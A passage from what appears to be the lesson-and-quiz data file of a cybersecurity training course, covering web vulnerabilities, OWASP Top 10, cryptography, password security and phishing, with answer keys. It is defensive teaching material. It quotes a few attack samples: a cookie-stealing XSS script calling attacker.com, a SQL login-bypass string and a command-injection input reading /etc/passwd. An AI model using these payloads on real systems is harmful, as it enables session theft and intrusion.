              <p>SQLi occurs when user inputs are concatenated directly into SQL queries rather than using parameters.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Vulnerable Query Logic</div>
                <pre style="font-family: monospace; font-size: 11px; padding: 8px; background: rgba(239, 68, 68, 0.1); border-left: 3px solid #ef4444; color: #ef4444;">
-- VULNERABLE DIRECT CONCATENATION:
SELECT * FROM users WHERE user = 'admin' AND pass = '' OR '1'='1';</pre>
                <pre style="font-family: monospace; font-size: 11px; padding: 8px; background: rgba(16, 185, 129, 0.1); border-left: 3px solid #10b981; color: #10b981;">
-- SECURE PREPARED STATEMENT:
SELECT * FROM users WHERE user = ? AND pass = ?;</pre>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary defense mechanism to prevent SQL Injection?",
              options: ["Input length verification", "Prepared Statements / Parameterized Queries", "Using JavaScript firewalls", "Reinstalling the database"],
              answer: 1,
              explanation: "Parameterized Queries ensure that user inputs are treated strictly as data parameters, never interpreted as active SQL commands."
            }
          }
        ]
      },
      {
        title: "Advanced: Forgery & Mitigations",
        lessons: [
          {
            id: "web_l5",
            title: "Cross-Site Request Forgery (CSRF)",
            content: `
              <h3>Hijacking Existing Actions</h3>
              <p>CSRF forces a logged-in user to perform actions they did not intend (e.g. changing passwords or email coordinates on a background banking site they are already authenticated to).</p>
              
              <h4>Prevention:</h4>
              <p>Incorporate unique, cryptographically secure <strong>Anti-CSRF Tokens</strong> on all state-changing POST forms.</p>
            `,
            interactive: {
              type: "quiz",
              question: "How do anti-CSRF tokens defeat request forgery attacks?",
              options: [
                "They encrypt the user's password.",
                "They require a secret, dynamic token in forms that a third-party domain cannot access or forge.",
                "They disable cookie storage.",
                "They block Javascript executions."
              ],
              answer: 1,
              explanation: "Since third-party malicious sites cannot read the dynamic, unique session token stored in form states, their forged request is rejected by servers."
            }
          },
          {
            id: "web_l6",
            title: "Server-Side Request Forgery (SSRF)",
            content: `
              <h3>Coercing Internal Ingress Connections</h3>
              <p>SSRF occurs when an attacker forces a web server to make requests to internal network assets (such as local cloud metadata panels or loopback addresses <code>127.0.0.1</code>) that are protected from direct external access.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What endpoint is a common high-value target for SSRF attacks in cloud deployments?",
              options: ["External CDN URLs", "Local cloud metadata endpoint (e.g. 169.254.169.254)", "Static images folder", "Public DNS servers"],
              answer: 1,
              explanation: "Cloud metadata endpoints contain highly sensitive system configuration variables, keys, and dynamic instance authentication tokens."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "An analyst spots a comment containing '<script>document.location='http://attacker.com/cookie?'+document.cookie</script>' saved inside a discussion thread database. What is this?",
        options: ["Reflected XSS", "Stored XSS", "CSRF Hijack", "SQL Injection"],
        answer: 1,
        explanation: "Since the script is stored inside the thread's persistent database and loads for all subsequent readers, it is Stored XSS."
      },
      {
        question: "What security flag should be appended to session cookies to ensure they are never transmitted over unencrypted HTTP?",
        options: ["HttpOnly", "SameSite", "Secure", "Domain"],
        answer: 2,
        explanation: "The 'Secure' flag mandates that the client browser must only transmit this cookie over TLS/HTTPS encrypted connections."
      },
      {
        question: "Which of the following is highly vulnerable to SQL Injection?",
        options: [
          "Parameterized queries using placeholders",
          "Dynamic query building via raw string interpolation of user inputs",
          "Hardcoded application API endpoints",
          "Strict JSON input validation schemas"
        ],
        answer: 1,
        explanation: "String interpolation directly stitches inputs into queries, allowing SQL commands inside inputs to manipulate the database control flow."
      }
    ],
    finalAssessment: {
      type: "code-review",
      prompt: "Review the following query statement: <code>query = 'SELECT * FROM accounts WHERE id = ' + userInput</code>. How would you patch this?",
      options: [
        "Change to 'SELECT * FROM accounts WHERE id = ' + encodeURIComponent(userInput)",
        "Use parameterized queries: 'SELECT * FROM accounts WHERE id = ?' and bind userInput as a parameter",
        "Append an HttpOnly header to the query string",
        "Enable HSTS on the local database port"
      ],
      answer: 1,
      expectedText: "Use parameterized query bindings."
    }
  },
  {
    id: "owasp-top-10",
    title: "OWASP Top 10",
    description: "Understand the industry-standard guide for the ten most critical web application security risks.",
    level: "Intermediate",
    icon: "book-open",
    coverColor: "linear-gradient(135deg, rgba(168, 85, 247, 0.25) 0%, rgba(139, 92, 246, 0.05) 100%)",
    glowColor: "rgba(168, 85, 247, 0.4)",
    readingTime: "55 min",
    skills: ["Top 10 Mapping", "Access Control Audits", "Cryptographic Defenses", "Security Logging"],
    objectives: [
      "Categorize and map application risks using the modern OWASP framework.",
      "Diagnose and mitigate Broken Access Control vulnerability patterns.",
      "Assess cryptographic storage and configure proper defensive logs."
    ],
    chapters: [
      {
        title: "Beginner: Access & Keys",
        lessons: [
          {
            id: "ow_l1",
            title: "A01: Broken Access Control",
            content: `
              <h3>Horizontal vs Vertical Privilege Failures</h3>
              <p>Broken Access Control is currently the #1 risk in OWASP. It occurs when users can access resources they are not explicitly authorized for.</p>
              <ul>
                <li><strong>Vertical Escalation:</strong> Standard user accesses admin endpoints (e.g., <code>/api/admin/delete-user</code>).</li>
                <li><strong>Horizontal Escalation:</strong> User modifies account parameters to access another client's profile (e.g., changing <code>/profile?id=1001</code> to <code>?id=1002</code>).</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What is an IDOR (Insecure Direct Object Reference) an example of?",
              options: ["Cryptographic Failure", "Broken Access Control", "Security Misconfiguration", "Injection flaw"],
              answer: 1,
              explanation: "IDOR occurs when access controls are not verified, letting users access raw database IDs by manipulating parameter markers."
            }
          },
          {
            id: "ow_l2",
            title: "A02: Cryptographic Failures",
            content: `
              <h3>Protecting Data at Rest & In Transit</h3>
              <p>Formerly known as Sensitive Data Exposure, this occurs when sensitive data (passwords, health records) is stored or transmitted insecurely.</p>
              
              <h4>Common Causes:</h4>
              <ul>
                <li>Transmitting credentials over unencrypted HTTP.</li>
                <li>Using outdated hashing algorithms like MD5 or SHA1.</li>
                <li>Hardcoding encryption keys directly in the public source repository.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which hash algorithm is considered highly insecure for modern password storage?",
              options: ["Argon2id", "bcrypt", "MD5", "PBKDF2"],
              answer: 2,
              explanation: "MD5 is extremely fast and suffers from severe collision vulnerabilities, letting attackers reverse password hashes in milliseconds using standard rainbow tables."
            }
          }
        ]
      },
      {
        title: "Intermediate: Injection & Configuration",
        lessons: [
          {
            id: "ow_l3",
            title: "A03: Injection & Validation Flaws",
            content: `
              <h3>Sanitizing Query Inputs</h3>
              <p>Injection flaws occur when untrusted data is processed as commands. This includes SQL, LDAP, OS command injections, and XML External Entities (XXE).</p>
              
              <h4>OS Command Injection Example:</h4>
              <p>If an application lets you input an IP to ping, and concatenates it as <code>system("ping " + input)</code>, inputting <code>8.8.8.8; cat /etc/passwd</code> will trigger both commands on the system.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary danger of OS Command Injection?",
              options: [
                "It slow downs web browsing speeds.",
                "It lets attackers run arbitrary shell commands on target hosts.",
                "It changes password hashes.",
                "It triggers network loops."
              ],
              answer: 1,
              explanation: "OS Command Injection allows attackers to piggyback malicious terminal commands onto legitimate application processing loops."
            }
          },
          {
            id: "ow_l4",
            title: "A05: Security Misconfiguration",
            content: `
              <h3>Securing Defaults</h3>
              <p>Applications are vulnerable if default administrator settings, sample folders, debugging tools, or detailed verbose error codes are left enabled in production.</p>
            `,
            interactive: {
              type: "quiz",
              question: "Why should verbose debugging error traces be disabled in production environments?",
              options: [
                "They slow down page rendering times.",
                "They reveal stack traces, database engines, and structural directories that attackers can use to target exploits.",
                "They compress data frames.",
                "They override client stylesheet classes."
              ],
              answer: 1,
              explanation: "Verbose error traces outline internal database formats, server file hierarchies, and coding structures, lowering the complexity of penetration attempts."
            }
          }
        ]
      },
      {
        title: "Advanced: Vulns & Telemetry",
        lessons: [
          {
            id: "ow_l5",
            title: "A06: Vulnerable & Outdated Components",
            content: `
              <h3>The Software Supply Chain Risk</h3>
              <p>Modern apps import hundreds of dependencies. If an underlying library contains a known exploit, the entire web stack is vulnerable (e.g., the infamous <strong>Log4Shell</strong> exploit in Java logging packages).</p>
            `,
            interactive: {
              type: "quiz",
              question: "What security concept focuses on auditing the dependency tree of an application?",
              options: ["SQLi Sanitization", "Software Supply Chain Security / SCA", "Network Segmentation", "Cryptography Keys"],
              answer: 1,
              explanation: "Software Composition Analysis (SCA) automatically checks imports and underlying package dependencies against active vulnerability databases."
            }
          },
          {
            id: "ow_l6",
            title: "A09: Security Logging & Monitoring Failures",
            content: `
              <h3>Why Lack of Detection is Dangerous</h3>
              <p>On average, breaches take over 200 days to detect. Without detailed audit logging, security teams cannot reconstruct lateral movements, trace attacker accounts, or identify stolen resources during post-incident analysis.</p>
            `,
            interactive: {
              type: "quiz",
              question: "Which security component is severely hampered by a lack of audit logging?",
              options: ["Transport encryption", "Response parsing", "Incident response and post-breach forensics", "Page access speed"],
              answer: 2,
              explanation: "Forensic analysts rely entirely on historical system logs to build attack timelines, trace access, and identify compromised files."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "Which of the following is categorized as OWASP A01: Broken Access Control?",
        options: [
          "Failing to enforce HTTPS transport",
          "Letting a guest user access administrator dashboard endpoints by directly typing the URL",
          "Logging passwords in raw text",
          "A SQL injection vulnerability on search input"
        ],
        answer: 1,
        explanation: "Failing to verify access privileges at server endpoints, letting users view pages they do not possess authorization for, is a core Broken Access Control flaw."
      },
      {
        question: "Why are default administrator configurations (e.g. admin/admin) so dangerous?",
        options: [
          "They cannot connect to the database.",
          "They are universally documented and are target #1 for automated brute force scanners.",
          "They disable CSS styling.",
          "They encrypt the server log files."
        ],
        answer: 1,
        explanation: "Default credentials are well documented and actively targeted by automated vulnerability bots searching IP blocks worldwide."
      },
      {
        question: "What is currently the #1 risk inside the OWASP Top 10 web application vulnerabilities ranking?",
        options: ["Cryptographic Failures", "Broken Access Control", "Injection Flaws", "Server-Side Request Forgery"],
        answer: 1,
        explanation: "Broken Access Control is categorized as A01, representing the single most widespread and critical vulnerability category in web software."
      }
    ],
    finalAssessment: {
      type: "access-audit",
      prompt: "Inspect the API access code: <code>app.get('/api/user/:id', (req, res) => { return res.json(db.getUser(req.params.id)) })</code>. What critical access check is completely missing?",
      options: [
        "Adding an SSL check logic",
        "Validating if the currently authenticated user session has permission to access the requested profile ID",
        "Checking if the parameter ID is a number",
        "Logging the query output to standard error"
      ],
      answer: 1,
      expectedText: "Missing authorization check against current session."
    }
  },
  {
    id: "cryptography",
    title: "Cryptography",
    description: "Unlock the mathematics of secrets. Secure information using hashing, symmetric, and asymmetric crypto algorithms.",
    level: "Advanced",
    icon: "lock-keyhole",
    coverColor: "linear-gradient(135deg, rgba(236, 72, 153, 0.25) 0%, rgba(219, 39, 119, 0.05) 100%)",
    glowColor: "rgba(236, 72, 153, 0.4)",
    readingTime: "60 min",
    skills: ["Hashing Math", "AES Symmetric Cipher", "Asymmetric RSA", "Key Exchanges"],
    objectives: [
      "Distinguish between symmetric and asymmetric cryptography workflows.",
      "Understand the mechanics of hashing algorithms and salted password databases.",
      "Trace the mathematical framework of RSA and Diffie-Hellman Key Exchanges."
    ],
    chapters: [
      {
        title: "Beginner: Hashing & AES",
        lessons: [
          {
            id: "cry_l1",
            title: "Symmetric vs Asymmetric Cryptography",
            content: `
              <h3>Defining Key Paradigms</h3>
              <p>Cryptography maps legible text (<strong>Plaintext</strong>) into secure scrambled output (<strong>Ciphertext</strong>).</p>
              <ul>
                <li><strong>Symmetric Encryption:</strong> Uses a single, shared secret key to both encrypt and decrypt data (e.g., AES). Extremely fast; perfect for file systems and local storage.</li>
                <li><strong>Asymmetric Encryption:</strong> Uses a mathematically linked keypair: a **Public Key** (distributed publicly to encrypt) and a **Private Key** (kept secure to decrypt) (e.g., RSA). Ideal for secure handshakes.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "If Alice wants to send an encrypted message to Bob using asymmetric encryption, which key should she encrypt with?",
              options: ["Alice's Private Key", "Alice's Public Key", "Bob's Public Key", "Bob's Private Key"],
              answer: 2,
              explanation: "Alice encrypts the message using Bob's Public Key. Only Bob possesses his Private Key, making him the only one capable of decrypting it."
            }
          },
          {
            id: "cry_l2",
            title: "Cryptographic Hash Functions",
            content: `
              <h3>One-Way Mathematical Integrity</h3>
              <p>Hashing maps inputs of any length into a fixed-size hex string. It is a one-way mathematical function; you cannot reverse the hash to find the original text.</p>
              
              <h4>Ideal Hash Criteria:</h4>
              <ul>
                <li><strong>Deterministic:</strong> Same input always yields identical output hash.</li>
                <li><strong>Pre-image Resistant:</strong> Impossible to back-calculate input from hash.</li>
                <li><strong>Collision Resistant:</strong> Extremely rare for two distinct inputs to yield matching hashes.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What core cybersecurity principle do cryptographic hash checks protect?",
              options: ["Confidentiality", "Integrity", "Availability", "Authentication"],
              answer: 1,
              explanation: "Hash algorithms are primarily utilized to verify data Integrity. If a single bit in a file changes, the entire resulting hash alters drastically."
            }
          }
        ]
      },
      {
        title: "Intermediate: Keypair Workflows",
        lessons: [
          {
            id: "cry_l3",
            title: "Advanced Encryption Standard (AES)",
            content: `
              <h3>Block Ciphers & Operational Modes</h3>
              <p>AES is the global gold standard for symmetric encryption, processing data in fixed 128-bit blocks.</p>
              <ul>
                <li><strong>Electronic Codebook (ECB):</strong> Encrypts identical plaintext blocks into identical ciphertext blocks, revealing patterns. (Highly vulnerable; e.g. the ECB Penguin vulnerability).</li>
                <li><strong>Cipher Block Chaining (CBC):</strong> XORs each plaintext block with the preceding ciphertext block, utilizing an <strong>Initialization Vector (IV)</strong> to ensure unique outputs.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Why should AES ECB mode be avoided for multi-block data?",
              options: [
                "It is too slow.",
                "It requires asymmetric keypairs.",
                "Identical blocks produce identical ciphertext, revealing structural patterns in data.",
                "It requires a database connection."
              ],
              answer: 2,
              explanation: "Because ECB encrypts identical blocks identically, the overall patterns of the underlying file are clearly visible in the ciphertext."
            }
          },
          {
            id: "cry_l4",
            title: "Public Key Infrastructure (PKI)",
            content: `
              <h3>The Chain of Trust</h3>
              <p>PKI manages digital certificates. It uses <strong>Certificate Authorities (CAs)</strong> to sign certificates with asymmetric keys, validating that a website's public key genuinely belongs to them, preventing impersonation attacks.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What entity digitally signs secure certificates to establish trust on public browsers?",
              options: ["Local Server DNS", "Content Delivery Network (CDN)", "Certificate Authority (CA)", "The database administrator"],
              answer: 2,
              explanation: "CAs are globally trusted institutions that verify domain ownership and sign digital certificates using their secure root private keys."
            }
          }
        ]
      },
      {
        title: "Advanced: Quantum & Exchanges",
        lessons: [
          {
            id: "cry_l5",
            title: "Diffie-Hellman Key Exchange",
            content: `
              <h3>Establishing Secrets Over Insecure Channels</h3>
              <p>Diffie-Hellman allows two parties to establish a shared symmetric secret key over an unencrypted public channel. It uses modular exponentiation: <code>g^ab mod p</code>.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What mathematical challenge makes reversing Diffie-Hellman exchanges extremely difficult for evesdroppers?",
              options: ["Prime division", "The Discrete Logarithm Problem", "Binary sorting complexity", "Quadratic equations"],
              answer: 1,
              explanation: "The Discrete Logarithm Problem is mathematically hard to solve, preventing eavesdroppers from finding exponents from values modulo p."
            }
          },
          {
            id: "cry_l6",
            title: "Digital Signatures & Non-Repudiation",
            content: `
              <h3>Proving Source Authenticity</h3>
              <p>Digital signatures use asymmetric keypairs in reverse. A sender hashes a document, encrypts it with their **Private Key**, and sends it. The recipient decrypts the signature with the sender's **Public Key** to verify integrity and origin authenticity. This guarantees **Non-Repudiation**—the sender cannot deny signing it.</p>
            `,
            interactive: {
              type: "quiz",
              question: "Which key is used to generate a valid Digital Signature?",
              options: ["The Sender's Private Key", "The Recipient's Public Key", "The CA's Public Key", "The Shared Session Key"],
              answer: 0,
              explanation: "The sender encrypts the hash with their own Private Key, proving that the signature could only have originated from them."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "Alice wishes to sign a document to prove it came from her. What key does she use?",
        options: ["Her Private Key", "Her Public Key", "Bob's Public Key", "Bob's Private Key"],
        answer: 0,
        explanation: "Signing requires the sender's Private Key, allowing others to verify authenticity using her public key."
      },
      {
        question: "What is the primary difference between hashing and encryption?",
        options: [
          "Hashing is symmetric while encryption is asymmetric.",
          "Hashing is a one-way function that cannot be decrypted; encryption is two-way and designed for decryption.",
          "Hashing uses key pairs while encryption uses only public keys.",
          "Hashing is insecure while encryption is secure."
        ],
        answer: 1,
        explanation: "Hashing is a one-way integrity check, whereas encryption is a reversible process designed to keep data secure but accessible with keys."
      },
      {
        question: "Which algorithm is a secure symmetric block cipher?",
        options: ["RSA", "Diffie-Hellman", "AES", "SHA-256"],
        answer: 2,
        explanation: "AES (Advanced Encryption Standard) is a highly optimized, universally trusted symmetric block cipher."
      }
    ],
    finalAssessment: {
      type: "cipher-decrypt",
      prompt: "A ciphertext was encrypted with a ROT13 Caesar shift: <code>PELCGB</code>. Decrypt the text to uncover the plaintext word.",
      options: [
        "CRYPTO",
        "SECURE",
        "SHIELD",
        "HACKER"
      ],
      answer: 0,
      expectedText: "CRYPTO"
    }
  },
  {
    id: "password-security",
    title: "Password Security",
    description: "Secure the keys to the castle. Learn modern authentication protocols, hashing formulas, and MFA structures.",
    level: "Beginner",
    icon: "key-round",
    coverColor: "linear-gradient(135deg, rgba(245, 158, 11, 0.2) 0%, rgba(217, 119, 6) 100%)",
    glowColor: "rgba(245, 158, 11, 0.4)",
    readingTime: "35 min",
    skills: ["Password Entropy", "bcrypt & Argon2", "Salting & Peppering", "MFA Protocols"],
    objectives: [
      "Calculate password strength and mathematical entropy.",
      "Explain why bcrypt, scrypt, and Argon2 are superior to SHA-256 for user authentication.",
      "Understand MFA token validation and standard SSO integrations."
    ],
    chapters: [
      {
        title: "Beginner: Strength & Hashing",
        lessons: [
          {
            id: "pwd_l1",
            title: "Password Entropy & Strength Calculations",
            content: `
              <h3>The Mathematics of Guessing</h3>
              <p>Password strength is measured in bits of **Entropy** (the mathematical measure of randomness). It determines how long it would take an offline brute force attacker to guess the password.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Shannon Entropy Formula</div>
                <div style="font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.4); line-height: 1.6;">
                  Entropy (E) = L &times; log2(R)<br>
                  L = Password Length<br>
                  R = Character Pool Size (Lowercase=26, Alphanumeric=62, Special=95)<br><br>
                  <span class="text-cyan">E > 60 bits is recommended for modern web endpoints.</span>
                </div>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "Why is a longer passphrase (e.g. 'correcthorsebatterystaple') safer than a short complex word (e.g. 'Tr0ub4$')?",
              options: [
                "Short words take longer to hash.",
                "Length increases entropy exponentially, making dictionary and brute force attempts statistically unfeasible.",
                "Shorter passwords confuse database indexes.",
                "Long passwords are encrypted twice."
              ],
              answer: 1,
              explanation: "Since length acts as the multiplier, longer phrases exponentially increase the total combinations, defeating modern brute-force hardware."
            }
          },
          {
            id: "pwd_l2",
            title: "Adaptive Slow Hashing: bcrypt & Argon2",
            content: `
              <h3>Why SHA-256 is Bad for Passwords</h3>
              <p>SHA-256 is designed to be blindingly fast. A standard CPU can calculate millions of SHA-256 hashes per second, letting hackers guess passwords rapidly. Password hashing requires intentionally **slow**, memory-intensive algorithms like **bcrypt** or **Argon2id** with variable work factors.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary purpose of a 'Work Factor' inside bcrypt hashing configuration?",
              options: [
                "It compresses the output hash.",
                "It increases the time required to compute each hash, slowing brute-force attackers down.",
                "It disables database writes.",
                "It validates certificates."
              ],
              answer: 1,
              explanation: "Adjusting the work factor doubles the calculation time with each increment, maintaining defense as hardware speeds increase."
            }
          }
        ]
      },
      {
        title: "Intermediate: Salts & Peppers",
        lessons: [
          {
            id: "pwd_l3",
            title: "Salting & Peppering Databases",
            content: `
              <h3>Preventing Bulk Rainbow Attacks</h3>
              <ul>
                <li><strong>Salt:</strong> A random, unique string appended to each user's password before hashing, stored in the database. It guarantees identical passwords have unique hashes, rendering precomputed <strong>Rainbow Tables</strong> completely useless.</li>
                <li><strong>Pepper:</strong> A secret string appended to all passwords, stored in secure configurations outside the database. If a hacker dumps the database, they still lack the pepper needed to brute-force hashes.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What attack vector is completely neutralized by using unique salts?",
              options: ["SQL Injection", "Precomputed Rainbow Table attacks", "Phishing campaigns", "Brute-force SSH guessing"],
              answer: 1,
              explanation: "Rainbow tables map known plaintext words to hashes. Salting forces unique hashes for identical words, rendering these static tables useless."
            }
          },
          {
            id: "pwd_l4",
            title: "Multi-Factor Authentication (MFA)",
            content: `
              <h3>MFA Categories</h3>
              <p>MFA requires credentials from multiple distinct categories:</p>
              <ul>
                <li><strong>Something you know:</strong> Passwords, PINs.</li>
                <li><strong>Something you have:</strong> Authenticator apps (TOTP), hardware keys, SMS.</li>
                <li><strong>Something you are:</strong> Fingerprints, facial scans.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What protocol is commonly used by Google Authenticator for dynamic 6-digit codes?",
              options: ["TOTP (Time-Based One-Time Password)", "HOTP", "SAML", "OAuth 2.0"],
              answer: 0,
              explanation: "TOTP generates short-lived authentication pins by combining a shared secret key with the current unix time."
            }
          }
        ]
      },
      {
        title: "Advanced: SSO & Passwords",
        lessons: [
          {
            id: "pwd_l5",
            title: "Single Sign-On (SSO) & SAML/OIDC",
            content: `
              <h3>Centralizing Identity</h3>
              <p>SSO delegates authentication to centralized identity providers (IdPs), reducing the number of password databases in the wild. Key protocols include:</p>
              <ul>
                <li><strong>SAML:</strong> XML-based, common in enterprise setups.</li>
                <li><strong>OIDC (OpenID Connect):</strong> JSON-based, built on top of OAuth 2.0.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which of the following is OIDC built on top of?",
              options: ["SAML", "SOAP", "OAuth 2.0", "FTP"],
              answer: 2,
              explanation: "OpenID Connect (OIDC) is an identity layer built directly on top of the OAuth 2.0 framework to authenticate users."
            }
          },
          {
            id: "pwd_l6",
            title: "Passwordless: FIDO2 & WebAuthn",
            content: `
              <h3>The Passwordless Future</h3>
              <p>WebAuthn is a web standard allowing apps to use the device's built-in cryptographic hardware (biometrics, secure enclaves, YubiKeys). It uses asymmetric cryptography to sign challenges, completely removing passwords from the equation, neutralizing phishing.</p>
            `,
            interactive: {
              type: "quiz",
              question: "Why are WebAuthn and FIDO2 immune to standard Phishing credential harvesting?",
              options: [
                "They require long pins.",
                "They are bound to specific domain origins, meaning a fake cloned login site cannot request or accept keys.",
                "They encrypt emails.",
                "They require a monthly subscription."
              ],
              answer: 1,
              explanation: "FIDO2 protocols cryptographically verify origin domains, so a spoofed site (e.g. bank-cloned.com) cannot activate keys configured for genuine bank.com domain tags."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "Which hash algorithm is highly secure and memory-hard for modern password storage?",
        options: ["MD5", "Argon2id", "SHA-1", "SHA-256"],
        answer: 1,
        explanation: "Argon2id won the Password Hashing Competition (PHC) for its configurable memory-hardness and protection against GPU-based brute-force cracking."
      },
      {
        question: "What is the key difference between a Salt and a Pepper?",
        options: [
          "Salts are private while peppers are public.",
          "Salts are stored in the database next to hashes; peppers are stored separate from databases in server config files.",
          "Salts encrypt the data; peppers decrypt the data.",
          "Salts are numbers; peppers are letters."
        ],
        answer: 1,
        explanation: "Salts render bulk rainbow tables useless and are stored alongside hashes. Peppers add an extra layer of defense in server configuration files."
      },
      {
        question: "How does TOTP keep verification codes valid for only 30 seconds?",
        options: [
          "It connects to the internet to fetch codes.",
          "It hashes a shared secret key combined with the current timestamp in 30-second steps.",
          "It uses biometric hardware.",
          "It deletes the user account after 30 seconds."
        ],
        answer: 1,
        explanation: "By combining the shared secret key with the current unix time, divided into 30-second buckets, both client and server generate matching codes in real-time."
      }
    ],
    finalAssessment: {
      type: "entropy-math",
      prompt: "Calculate the mathematical complexity pool size (R) of a password containing ONLY lowercase letters (e.g. 'abcdefg').",
      options: [
        "10",
        "26",
        "52",
        "95"
      ],
      answer: 1,
      expectedText: "26 options (a-z)"
    }
  },
  {
    id: "phishing-awareness",
    title: "Phishing Awareness",
    description: "Identify social engineering tactics. Detect domain spoofing and secure the human firewall.",
    level: "Beginner",
    icon: "mail",
    coverColor: "linear-gradient(135deg, rgba(6, 182, 212, 0.2) 0%, rgba(56, 189, 248, 0.1) 100%)",
    glowColor: "rgba(6, 182, 212, 0.4)",
    readingTime: "30 min",
    skills: ["Email Red Flags", "Domain Spoofing Check", "SPF/DKIM Records", "Phishing Triages"],
    objectives: [
      "Spot visual indicators and psychological triggers of phishing.",
      "Inspect email headers to verify authenticity parameters.",
      "Understand SPF, DKIM, and DMARC configuration mechanics."
    ],
    chapters: [
      {
        title: "Beginner: Spotting Lures",
        lessons: [
          {
            id: "phi_l1",
            title: "Anatomy of a Phishing Email",
            content: `
              <h3>Psychological and Technical Traps</h3>
              <p>Phishing exploits human psychology. Attackers bypass logic by inducing fear, urgency, curiosity, or financial desire.</p>
              
              <h4>Visual Red Flags to Scan:</h4>
              <ul>
                <li><strong>Sender Address Discrepancies:</strong> Display name says 'CEO' but email domain reads <code>ceo@gmail-verify.com</code>.</li>
                <li><strong>Generic Greetings:</strong> 'Dear Customer' instead of customized user account tags.</li>
                <li><strong>Urgent Deadlines:</strong> 'Password expires in 2 hours - Update IMMEDIATELY'.</li>
                <li><strong>Hover-Link Mismatch:</strong> Link says 'bank.com' but hovering reveals destination is <code>scam-server.ru/form</code>.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What is the safest way to verify a login request received in an urgent email?",
              options: [
                "Click the link inside the email immediately.",
                "Reply to the email requesting validation.",
                "Manually type the trusted corporate domain name directly into the browser address bar.",
                "Forward the email to coworkers to see if they clicked it."
              ],
              answer: 2,
              explanation: "Never click unsolicited links. Manually navigating directly to the official known URL avoids domain redirection traps entirely."
            }
          },
          {
            id: "phi_l2",
            title: "Phishing Categories: Spear & Whaling",
            content: `
              <h3>Hyper-Targeted Attacks</h3>
              <ul>
                <li><strong>Phishing:</strong> Bulk generic spray-and-pray emails sent to millions.</li>
                <li><strong>Spear Phishing:</strong> Highly targeted, personalized campaigns utilizing researched context (e.g., matching the victim's project names, colleagues, or vendors).</li>
                <li><strong>Whaling:</strong> Spear phishing directed specifically at high-value executive profiles (CEOs, CFOs) to authorize massive fund transfers or reveal intellectual secrets.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What term describes a personalized phishing attempt targeting a high-level corporate CFO?",
              options: ["Vishing", "Smishing", "Whaling", "Watering Hole"],
              answer: 2,
              explanation: "Whaling targets the biggest fish in corporate organizations, such as executives, to bypass financial or administrative gateways."
            }
          }
        ]
      },
      {
        title: "Intermediate: DNS Defenses",
        lessons: [
          {
            id: "phi_l3",
            title: "SPF, DKIM & DMARC Frameworks",
            content: `
              <h3>Technical Pillars of Email Security</h3>
              <p>SMTP is insecure by default. Anyone can forge senders. DNS security records allow servers to verify sender authenticity:</p>
              <ul>
                <li><strong>SPF (Sender Policy Framework):</strong> A DNS TXT record listing all IP addresses authorized to send emails on behalf of a domain.</li>
                <li><strong>DKIM (DomainKeys Identified Mail):</strong> Appends a digital cryptographic signature to email headers, verifying the message has not been altered in transit.</li>
                <li><strong>DMARC:</strong> Instructs receiving servers on what to do if SPF or DKIM checks fail (e.g. <code>p=reject</code>, <code>p=quarantine</code>).</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which DNS record appends a cryptographic signature to outgoing email headers?",
              options: ["SPF Record", "DMARC Record", "DKIM Record", "MX Record"],
              answer: 2,
              explanation: "DKIM uses asymmetric cryptographic keys to append dynamic signatures verifying both sender domain ownership and email integrity."
            }
          },
          {
            id: "phi_l4",
            title: "Analyzing Email Headers",
            content: `
              <h3>Reading SMTP Envelopes</h3>
              <p>When triaging suspicious emails, analysts inspect the raw headers to check path variables:</p>
              <ul>
                <li><code>Return-Path</code>: The actual envelope address where bounce alerts are routed.</li>
                <li><code>Received-From</code>: The physical IP addresses of the relays that forwarded the message.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "If the 'From:' says 'support@bank.com' but the envelope 'Return-Path:' reads 'attacker@scamhost.net', what indicates a phishing vector?",
              options: [
                "The email body length.",
                "Mismatch between the declared sender address and the actual envelope return address.",
                "The encryption speed.",
                "The server location."
              ],
              answer: 1,
              explanation: "Envelope mismatches (Return-Path and From fields) are a classic indicator of domain spoofing and forged SMTP payloads."
            }
          }
        ]
      },
      {
        title: "Advanced: Simulations & Incident Triage",
        lessons: [
          {
            id: "phi_l5",
            title: "Triage Protocols & Incident Response",
            content: `
              <h3>Triaging Reports</h3>
              <p>When an employee reports a suspicious email, SOC analysts isolate it in an analysis sandbox, extract URLs to inspect, check attachment hashes, and run search scans to delete matching copies from other employee mailboxes.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary danger of opening an email attachment in a raw office computer without sandboxing?",
              options: [
                "It changes browser themes.",
                "The attachment may execute malicious macro scripts, installing malware directly in memory.",
                "It formats the database.",
                "It disables local routers."
              ],
              answer: 1,
              explanation: "Attachments can execute macros or exploitation scripts, establishing a direct hacker backdoor inside corporate systems."
            }
          },
          {
            id: "phi_l6",
            title: "Educational Phishing Simulations",
            content: `
              <h3>Strengthening the Human Firewall</h3>
              <p>Security teams conduct periodic, realistic phishing simulation campaigns to baseline user resilience. Users who slip up are redirected to short, constructive coaching blocks, raising organizational awareness.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What is the goal of a corporate Phishing Simulation campaign?",
              options: [
                "To fire non-technical employees.",
